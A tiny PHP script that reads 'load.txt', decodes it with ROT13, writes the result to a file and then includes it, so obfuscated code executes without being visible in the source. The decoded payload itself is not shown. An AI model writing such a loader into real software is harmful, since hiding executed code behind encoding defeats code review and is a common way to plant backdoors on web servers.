<?php
$kk = file_get_contents("load.txt");
$kk = str_rot13($kk);
file_put_contents('load', $kk);
include "load";